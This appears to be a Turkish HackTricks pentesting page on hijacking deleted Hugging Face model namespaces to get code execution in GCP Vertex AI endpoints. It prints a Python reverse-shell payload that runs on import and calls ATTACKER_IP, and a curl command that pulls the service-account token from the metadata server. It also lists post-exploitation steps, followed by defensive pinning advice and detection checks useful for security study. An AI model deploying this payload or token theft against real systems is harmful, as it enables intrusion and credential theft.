# GCP - Vertex AI Post-Exploitation aracılığıyla Hugging Face Model Namespace Yeniden Kullanımı

{{#include ../../../banners/hacktricks-training.md}}

## Senaryo

- Vertex AI Model Garden, birçok Hugging Face (HF) modelinin doğrudan dağıtılmasına izin verir.
- HF model tanımlayıcıları Author/ModelName şeklindedir. HF'de bir author/org silinirse, aynı author adı herhangi biri tarafından yeniden kaydedilebilir. Saldırganlar ardından aynı ModelName ile legacy path'te bir repo oluşturabilir.
- Yalnızca isimle (pinning/integrity yok) çeken Pipelines, SDKs veya cloud katalogları saldırgan kontrollü repoyu çeker. Model dağıtıldığında, o repodaki loader kodu Vertex AI endpoint container içinde çalışabilir ve endpoint'in izinleriyle RCE sağlayabilir.

HF'de iki yaygın takeover vakası:
- Sahiplik silinmesi: Eski yol 404 döner; author yeniden kaydedilip aynı ModelName yayınlanana kadar.
- Sahiplik transferi: HF, eski Author/ModelName'den yeni sahibine 307 yönlendirmesi yapar. Eğer eski author daha sonra silinip saldırgan tarafından yeniden kaydedilirse, yönlendirme zinciri kırılır ve saldırganın reposu legacy path'te hizmet verir.

## Yeniden Kullanılabilir Namespace'leri (HF) Tespit Etme

- Eski author silinmiş: author sayfası 404 döner; model yolu takeover gerçekleşene kadar 404 dönebilir.
- Transfer edilmiş modeller: eski model yolu, eski author var olduğu sürece yeni sahip için 307 yönlendirmesi yapar. Eğer eski author daha sonra silinip yeniden kaydedilirse, legacy path saldırganın reposuna yönlenir.

Hızlı kontroller curl ile:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## Vertex AI'ye Karşı Uçtan Uca Saldırı Akışı

1) Model Garden'ın deployable olarak listelediği yeniden kullanılabilir model namespace'lerini keşfedin:
- Vertex AI Model Garden'da hâlâ “verified deployable” olarak görünen HF modellerini bulun.
- Orijinal Author'ın silinip silinmediğini veya modelin transfer edilip edilmediğini ve eski Author'ın daha sonra kaldırılıp kaldırılmadığını HF üzerinde doğrulayın.

2) Silinmiş Author'ı HF üzerinde yeniden kaydedin ve aynı ModelName'i yeniden oluşturun.

3) Kötü amaçlı bir repo yayınlayın. Model yüklemesi sırasında çalışan kodu dahil edin. HF model yüklemesi sırasında yaygın olarak çalışan örnekler:
- Repodaki __init__.py içinde side effects
- config/auto_map tarafından referans verilen custom modeling_*.py veya processing kodu
- Transformers pipeline'larında trust_remote_code=True gerektiren code paths

4) Legacy Author/ModelName'in Vertex AI deployment'ı artık attacker repo'yu çeker. Loader, Vertex AI endpoint container içinde çalıştırılır.

5) Payload, endpoint ortamından (RCE) endpoint'in izinleriyle erişim sağlar.

Example payload fragment executed on import (for demonstration only):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Notlar
- Gerçek dünyadaki loader'lar değişkenlik gösterir. Birçok Vertex AI HF entegrasyonu, modelin config'inde referans verilen repo modüllerini (ör. auto_map) clone'lar ve import eder; bu, kod yürütmeyi tetikleyebilir. Bazı kullanımlar trust_remote_code=True gerektirir.
- Endpoint tipik olarak sınırlı kapsama sahip ayrılmış bir container içinde çalışır, ancak GCP'de veri erişimi ve lateral movement için geçerli bir initial foothold'tur.

## Post-Exploitation Tips (Vertex AI Endpoint)

Kod endpoint container içinde çalışmaya başladıktan sonra şu adımları düşünün:
- Kimlik bilgileri/tokens için ortam değişkenleri ve metadata'yı enumerate etmek
- Ekli storage'a veya mount edilmiş model artifact'larına erişmek
- service account identity üzerinden Google API'leriyle etkileşim kurmak (Document AI, Storage, Pub/Sub, vb.)
- Platform repo'yu yeniden çekerse model artifact içinde persistence sağlamak

Erişilebiliyorsa instance metadata'yı enumerate edin (container bağımlı):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Vertex AI kullanıcıları için savunma rehberi

- HF loaders'ta modelleri commit'e göre sabitleyin; sessiz değiştirmeyi önlemek için:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Onaylanmış HF modellerini güvenilir dahili bir artifact store/registry'ye mirror'layın ve dağıtımı oradan yapın.
- Kod tabanlarını ve konfigürasyonları, silinmiş/transfer edilmiş olarak hard-coded Author/ModelName için sürekli tarayın; yeni namespace'lere güncelleyin veya commit'e pinleyin.
- Model Garden'da, dağıtımdan önce model provenance ve yazarın varlığını doğrulayın.

## Recognition Heuristics (HTTP)

- Silinmiş yazar: yazar sayfası 404; legacy model yolu takeover'a kadar 404.
- Transfer edilmiş model: legacy yol 307 ile yeni yazara yönlendirilir; eski yazar varken; eğer eski yazar daha sonra silinir ve yeniden kayıt olursa, legacy yol saldırgan içeriği sunar.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Çapraz Referanslar

- Daha geniş metodoloji ve tedarik zinciri notlarına bakın:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Referanslar

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
